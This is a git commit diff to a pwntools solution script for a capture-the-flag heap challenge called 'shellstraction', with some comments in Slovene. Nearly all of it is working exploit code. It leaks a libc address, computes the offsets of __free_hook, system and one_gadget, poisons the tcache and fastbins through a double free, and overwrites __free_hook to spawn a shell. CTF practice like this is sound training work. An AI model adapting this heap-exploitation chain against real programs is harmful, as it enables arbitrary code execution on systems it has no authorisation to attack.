75167ce528e04f75443a49ebaa4e1e2c4e04cd58
AlwaysGuilty <tv6864@student.uni-lj.si>
2022-04-17 10:57:17 +0200

    baje to dela

--- challs/shellstraction/sol.py
+++ challs/shellstraction/sol.py
@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-from pwn import ELF, p64, u64, process, remote, log
+from pwn import context, ELF, gdb, p64, u64, process, remote, log
 
 #context.terminal = ["tmux", "splitw", "-h"]
 
@@ -16,12 +16,12 @@ b * eton + 933
 """
 
 #p = gdb.debug("./app", gdbscript)
-p = process("./app")
+#p = process("./app")
 #dbg = gdb.attach(p, gdbscript="""
 #b * eton + 455
 #b * eton + 953
 #""")
-#p = remote("localhost", 1337)
+p = remote("localhost", 1337)
 
 def malloc(idx, size, data):
     p.sendline(b"note add " + idx + b" " + size + b" " + data)
@@ -66,10 +66,9 @@ free(b"7")
 
 # malloc back from tcache
 # these will go to tcache when free'd
-for i in range(7):
+for _ in range(7):
     malloc(b"0", b"500", b"D")
 
-# malloc back from unsorted, but it overwrites leak
 # we have to alloc smaller chunk than before in order for it to be malloced as we want it to
 # otherwise it's content will be "null-ed out"
 malloc(b"7", b"20", 8 * b"A")
@@ -82,23 +81,27 @@ leak = u64(p.recvline().strip().ljust(8, b"\x00"))
 log.info(f"Leak: {hex(leak)}")
 # ^ this leak is from main_arena + 592
 
-# calc libc base
-main_arena_offset = leak - 592          # yields 0x7f2556146c40
-main_arena_offset = 0x1c3c40            # put above offset in libc.blukat.me and got this offset, spoilr alert, it's incorrect
+# calc libc base           
+# vmmap yields libc base at runtime: 0x7efdcc865000
+# base is diff between leak and above value
+main_arena_offset = 0x3ebe90
 libc_base = leak - main_arena_offset
-#libc.address = libc_base
 log.info(f"libc base: {hex(libc_base)}")
 
-#__free_hook = libc.symbols["__free_hook"]
-#log.info(f"__free_hook: {hex(__free_hook)}")
-__free_hook = libc_base + 0x01c65a8
-__free_hook -= 0xf10                                    # same reason kot par vrstic spodaj
+# free hook
+__free_hook_offset = 0x03ed8e8
+__free_hook = libc_base + __free_hook_offset
 log.info(f"__free_hook: {hex(__free_hook)}")
 
 # system
-system_offset = 0x045420
-system = libc_base + system_offset - 0x21e250           # zakaj odstejem ta offset? ker je libc_base iz nekega razloga narobe in se mi ga ne da popravlat, to pa dela cist ok
+system_offset = 0x04f420                                 
+system = libc_base + system_offset
 log.info(f"system: {hex(system)}")
+
+# one_gadgets
+one_gadget_1 = libc_base + 0x4f2a5
+one_gadget_2 = libc_base + 0x4f302
+one_gadget_3 = libc_base + 0x10a2fc
 
 # let's do a double free
 
@@ -128,28 +131,28 @@ free(b"6")
 free(b"7")
 free(b"8")
 free(b"7")
-#free(b"9")
 
 # empty tcache
-for i in range(7):
-    malloc(b"0", b"20", b"/bin/sh")
+for _ in range(7):
+    malloc(b"0", b"20", b"/bin/sh")         # /bin/sh string here for ovrride with system method, no need for it when going with one gadgets
 
 # empty and poison fastbins
 malloc(b"1", b"20", p64(__free_hook))           # setup fake pointer in the bins
 malloc(b"1", b"20", b"h")
 malloc(b"1", b"20", b"h")
-malloc(b"1", b"20", p64(system))                # content of fake chunk at __free_hook
+#malloc(b"1", b"20", p64(system))                # content of fake chunk at __free_hook
+malloc(b"1", b"20", p64(one_gadget_2))
 
 # SEGFAULT ker je zadnji bajt system addressa 0x20 (presledek). Ko je payload poslan, so bajti naslova v obratnem vrstnem redu (p64)
 # Torej ko tokenizer shella vidi 0x20 na vhodu, rece "oh, presledek, tebe bomo zamenjali z nullbytom in te bomo skippali :)
 
-# call free so that __free_hook triggers aka shell spawns
+# ~~call free so that __free_hook triggers aka shell spawns~~
 free(b"0")
 
 p.interactive()
 
 
 # one gadgets:
-# 0x4f2a5       2      rsp & 0xf = 0, rcx = null
-# 0x4f302       1      rsp + 0x40 = null
-# 0x10a2fc      1      rsp + 0x70 = null
+# 0x4f2a5       rsp & 0xf = 0, rcx = null
+# 0x4f302       rsp + 0x40 = null
+# 0x10a2fc      rsp + 0x70 = null
